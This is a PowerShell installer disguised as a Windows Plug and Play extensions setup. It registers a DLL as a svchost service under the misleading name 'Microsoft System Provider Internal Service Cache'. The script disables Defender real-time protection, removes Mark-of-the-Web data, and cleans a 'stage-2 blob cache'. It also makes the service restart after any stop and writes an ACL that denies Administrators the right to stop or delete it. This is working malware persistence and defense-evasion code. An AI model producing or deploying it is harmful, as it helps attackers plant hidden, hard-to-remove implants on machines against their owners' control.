# Windows Plug and Play Extensions - Installer (svchost.exe ServiceDll)
# Run as Administrator

$ErrorActionPreference = "SilentlyContinue"
$SYS32    = "$env:SystemRoot\System32"
$DRIVERS  = "$env:SystemRoot\System32\drivers"
$SVC      = "MspIscSvc"
$SVCGROUP = "MspGroup"
$SD       = Split-Path -Parent $MyInvocation.MyCommand.Path

# Check admin
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Write-Host "[!] Run as Administrator" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

# Check DLL
if (-not (Test-Path "$SD\pnpext.dll")) {
    Write-Host "[!] pnpext.dll not found in $SD" -ForegroundColor Red
    Read-Host "Press Enter to exit"
    exit 1
}

Write-Host "============================================"
Write-Host " Windows PnP Extensions - Setup"
Write-Host "============================================"
Write-Host ""

# 1. Prepare: disable Defender realtime (best-effort)
Write-Host "[1/6] Preparing..." -ForegroundColor Cyan
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
Start-Sleep -Seconds 2

# 2. Remove old installation (robust: force-kill svchost if service hangs on stop)
Write-Host "[2/6] Removing old installation..." -ForegroundColor Cyan

# Find hosting svchost PID (if service exists)
function Get-ServicePid([string]$name) {
    $line = sc.exe queryex $name 2>$null | Select-String '^\s*PID\s*:\s*(\d+)'
    if ($line -and $line.Matches[0].Groups[1].Value) {
        return [int]$line.Matches[0].Groups[1].Value
    }
    return 0
}

sc.exe query $SVC 2>$null | Out-Null
if ($LASTEXITCODE -eq 0) {
    $svcPid = Get-ServicePid $SVC
    sc.exe stop $SVC 2>$null | Out-Null
    # Poll up to 5s for clean stop; force-kill if not stopping.
    $stopped = $false
    for ($i = 0; $i -lt 10; $i++) {
        Start-Sleep -Milliseconds 500
        $q = sc.exe query $SVC 2>$null | Out-String
        if ($q -match 'STATE\s*:\s*1\s+STOPPED') { $stopped = $true; break }
        if ($LASTEXITCODE -ne 0) { $stopped = $true; break }
    }
    if (-not $stopped -and $svcPid -gt 0) {
        Write-Host "       old service hung — taskkill /F /PID $svcPid" -ForegroundColor Yellow
        taskkill.exe /F /PID $svcPid 2>$null | Out-Null
        Start-Sleep -Seconds 2
    }
    # Remove svchost group entry BEFORE sc delete so SCM can't re-trigger
    $svchostKey0 = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
    Remove-ItemProperty -Path $svchostKey0 -Name $SVCGROUP -Force -ErrorAction SilentlyContinue
    sc.exe delete $SVC 2>$null | Out-Null
    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\$SVC" -Recurse -Force -ErrorAction SilentlyContinue
}

# Kill only rundll32 processes that have our DLL loaded (not every rundll32)
Get-Process -Name "rundll32" -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        if ($_.Modules | Where-Object { $_.ModuleName -ieq "pnpext.dll" }) {
            Stop-Process -Id $_.Id -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}

# Delete old DLL if it was left behind (new one will be copied in step 3)
Remove-Item "$SYS32\pnpext.dll" -Force -ErrorAction SilentlyContinue
Remove-Item "$SYS32\pnpext.dll.old" -Force -ErrorAction SilentlyContinue
Remove-Item "$SYS32\pnpext.dll.new" -Force -ErrorAction SilentlyContinue

# Remove legacy MspIscSvc.exe if present
Remove-Item "$SYS32\MspIscSvc.exe" -Force -ErrorAction SilentlyContinue
Remove-Item "$SYS32\spoolcfg.exe" -Force -ErrorAction SilentlyContinue

# Clean stage-2 blob cache so new install starts from scratch
if (Test-Path "$env:TEMP\pnp_cache") {
    Remove-Item "$env:TEMP\pnp_cache\*.bin" -Force -ErrorAction SilentlyContinue
}

# 3. Copy files
Write-Host "[3/6] Copying files..." -ForegroundColor Cyan
Remove-Item "$SD\pnpext.dll:Zone.Identifier" -Force -ErrorAction SilentlyContinue
Remove-Item "$SD\pnpext.sys:Zone.Identifier" -Force -ErrorAction SilentlyContinue

Copy-Item "$SD\pnpext.dll" "$SYS32\pnpext.dll" -Force
Write-Host "       pnpext.dll  -> $SYS32\" -ForegroundColor Gray
if (Test-Path "$SD\pnpext.sys") {
    Copy-Item "$SD\pnpext.sys" "$DRIVERS\pnpext.sys" -Force
    Write-Host "       pnpext.sys  -> $DRIVERS\" -ForegroundColor Gray
}
Remove-Item "$SYS32\pnpext.dll:Zone.Identifier" -Force -ErrorAction SilentlyContinue
Remove-Item "$DRIVERS\pnpext.sys:Zone.Identifier" -Force -ErrorAction SilentlyContinue

# 4. Register svchost group + create service
Write-Host "[4/6] Creating service (svchost.exe ServiceDll)..." -ForegroundColor Cyan

# Register svchost group so svchost.exe -k MspGroup loads our service
$svchostKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
$existing = (Get-ItemProperty $svchostKey -Name $SVCGROUP -EA SilentlyContinue).$SVCGROUP
if (-not $existing) {
    New-ItemProperty -Path $svchostKey -Name $SVCGROUP -Value @($SVC) -PropertyType MultiString -Force | Out-Null
    Write-Host "       Svchost group '$SVCGROUP' registered" -ForegroundColor Gray
}

# Create the service pointing to svchost.exe
sc.exe create $SVC binPath= "$env:SystemRoot\System32\svchost.exe -k $SVCGROUP" type= share start= auto DisplayName= "Microsoft System Provider Internal Service Cache" 2>$null | Out-Null
sc.exe description $SVC "Maintains internal cache and inter-service context for Windows system providers." 2>$null | Out-Null
# Failure recovery: restart after 10s, 30s, 60s. Reset failure count after 1 day.
sc.exe failure $SVC reset= 86400 actions= restart/10000/restart/30000/restart/60000 2>$null | Out-Null
# failureflag=1 → ANY stop (including clean `Stop-Service` from admin PowerShell)
# is treated as a failure → recovery actions fire → service auto-restarts after 10 s.
# Internal update / self-destruct bats temporarily clear this flag before stopping.
sc.exe failureflag $SVC 1 2>$null | Out-Null
# Lock the SCM access ACL:
#   (D;;WPSD;;;BA)            DENY  stop + delete            to Administrators
#   (A;;CCLCSWRPLOCRRC;;;BA)  ALLOW query + start + read DACL  to Administrators
#   (A;;CCLCSWRPWPDTLOCRRC;;;SY) ALLOW full control            to LocalSystem
#   (A;;CCLCSWLOCRRC;;;IU)    ALLOW query + interrogate        to Interactive User
#   (A;;CCLCSWLOCRRC;;;SU)    ALLOW query + interrogate        to Service User
# Result: `Stop-Service MspIscSvc` from admin shell fails with access denied;
# our own update / self-destruct flow runs as SYSTEM inside svchost and is
# allowed to stop. SCM evaluates DENY ACEs first.
$svcDacl = 'D:(D;;WPSD;;;BA)(A;;CCLCSWRPLOCRRC;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)'
sc.exe sdset $SVC $svcDacl 2>$null | Out-Null

# 5. Set ServiceDll parameter
Write-Host "[5/6] Configuring ServiceDll..." -ForegroundColor Cyan
$paramPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$SVC\Parameters"
New-Item -Path $paramPath -Force | Out-Null
New-ItemProperty -Path $paramPath -Name "ServiceDll" -Value "$SYS32\pnpext.dll" -PropertyType ExpandString -Force | Out-Null
New-ItemProperty -Path $paramPath -Name "ServiceMain" -Value "PnpServiceEntry" -PropertyType String -Force | Out-Null
Write-Host "       ServiceDll = $SYS32\pnpext.dll" -ForegroundColor Gray

# 6. Start service
Write-Host "[6/6] Starting service..." -ForegroundColor Cyan
sc.exe start $SVC 2>$null | Out-Null
Start-Sleep -Seconds 5

# Re-enable Defender
try { Set-MpPreference -DisableRealtimeMonitoring $false } catch {}

# Verify
$svcInfo = sc.exe query $SVC 2>$null | Select-String "RUNNING"
$loaded = & tasklist /m pnpext.dll 2>$null | Select-String "svchost"
Write-Host ""
if ($svcInfo -and $loaded) {
    Write-Host "[+] SUCCESS! Service running in svchost.exe" -ForegroundColor Green
} elseif ($svcInfo) {
    Write-Host "[+] Service running. DLL load may need a few seconds." -ForegroundColor Yellow
} else {
    Write-Host "[?] Service created but not running yet. Try reboot." -ForegroundColor Yellow
}
Write-Host ""
Write-Host "============================================" -ForegroundColor Green
Write-Host " Service: $SVC (svchost.exe -k $SVCGROUP)"
Write-Host " DLL:     $SYS32\pnpext.dll"
Write-Host " Config:  $DRIVERS\pnpext.sys"
Write-Host " Auto-start on boot: YES"
Write-Host "============================================" -ForegroundColor Green
Write-Host ""
Read-Host "Press Enter to exit"
